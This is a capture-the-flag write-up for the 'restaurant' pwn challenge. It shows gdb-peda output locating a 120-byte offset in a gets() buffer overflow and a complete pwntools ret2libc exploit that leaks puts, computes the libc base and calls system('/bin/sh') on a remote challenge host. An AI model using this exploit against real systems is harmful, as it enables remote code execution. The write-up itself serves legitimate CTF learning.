# restaurant : pwn

Flag Proof: `CTF{33be4238b68642a4c3f97d10cfa034764e0b6d9707d6970f581200e2b7bcbfc0}`

## Summary:

- Some basic ret2libc pwn challange
- First i tried to get the offset of `RIP`:

```c
gdb-peda$ pattern_create 200                                                                                                                                                                                                                 
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'                                   
gdb-peda$ run                                                                                                                                                                                                                        [11/171]
Starting program: /home/kali/ctfs/unbrk2022/restaurant/restaurant                                                                                                                                                                            
==============================                                                                                                                                                                                                               
              MENU                                                                                                                                                                                                                           
==============================                                                                                                                                                                                                               
1. Chessburger...............2$                                                                                                                                                                                                              
2. Hamburger.................3$                                                                                                                                                                                                              
3. Custom dinner............10$                                                                                                                                                                                                              
>> 3                                                                                                                 Choose what you want to eat:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA
AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA                                                                                                                                 
                                                                                                                                                                                                                                             
Program received signal SIGSEGV, Segmentation fault.                                                                                                                                                                                         
[----------------------------------registers-----------------------------------]                                      
RAX: 0x0                                                   
RBX: 0x400840 (<__libc_csu_init>:       push   r15)        
RCX: 0x7ffff7fa09a0 --> 0xfbad208b                         
RDX: 0x0                                                   
RSI: 0x7ffff7fa0a23 --> 0xfa29c0000000000a                 
RDI: 0x7ffff7fa29c0 --> 0x0                                
RBP: 0x41414e4141384141 ('AA8AANAA')                       
RSP: 0x7fffffffdd88 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")              
RIP: 0x40076b (<custom+65>:     ret)                       
R8 : 0x7fffffffdd10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
R9 : 0x0                                                   
R10: 0xfffffffffffff448                                    
R11: 0x246                                                 
R12: 0x400600 (<_start>:        xor    ebp,ebp)            
R13: 0x0                                                   
R14: 0x0                                                   
R15: 0x0                                                   
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)                                     
[-------------------------------------code-------------------------------------]                                      
   0x400760 <custom+54>:        call   0x4005e0 <gets@plt>                                                            
   0x400765 <custom+59>:        mov    eax,0x0             
   0x40076a <custom+64>:        leave                      
=> 0x40076b <custom+65>:        ret                        
   0x40076c <main>:     push   rbp                         
   0x40076d <main+1>:   mov    rbp,rsp                     
   0x400770 <main+4>:   sub    rsp,0x10                    
   0x400774 <main+8>:   mov    eax,0x0                     
[------------------------------------stack-------------------------------------]                                      
0000| 0x7fffffffdd88 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")             
0008| 0x7fffffffdd90 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                     
0016| 0x7fffffffdd98 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                             
0024| 0x7fffffffdda0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                                     
0032| 0x7fffffffdda8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                                             
0040| 0x7fffffffddb0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")                                                     
0048| 0x7fffffffddb8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")  
0056| 0x7fffffffddc0 ("AuAAXAAvAAYAAwAAZAAxAAyA")          
[------------------------------------------------------------------------------]                                      
Legend: code, data, rodata, value                          
Stopped reason: SIGSEGV                                    
0x000000000040076b in custom ()                            
gdb-peda$ pattern_offset AA8AANAA                          
AA8AANAA found at offset: 112
```

- We got `RBP` at 112 so `RIP` on 64 bits should be at 112 + 8 →120
- Now we leak the address of puts, so we find the libc library
- Searched on [https://libc.blukat.me/](https://libc.blukat.me/?fbclid=IwAR1VKpzRCXZtIHuduDbsUTwpcrSnE3eIx1YuThlQDEDQuTYuKS7_SevJQ0k) for the offsets of functions and get to `the` libc base address, then add what we need so we get to `bin/sh` and `system`
- The final code being

```c
from pwn import *
context.log_level = 'debug'

elf = ELF("./restaurant")
rop = ROP("./restaurant")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")

offset = 120

r = remote("34.159.62.47",30736)
r.recv()
r.sendline(b"3")
r.recv()
r.sendline(b"A" * offset + p64(rop.rdi.address) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main))
leak = int.from_bytes(r.recv()[:6], 'little')
base = leak - 0x080aa0
r.sendline(b"3")
r.recv()
r.sendline(b"A" * offset + p64(next(elf.search(asm("ret"), executable=True))) + p64(rop.rdi.address) + p64(base + 0x1b3e1a) + p64(base + 0x04f550))
r.interactive()
```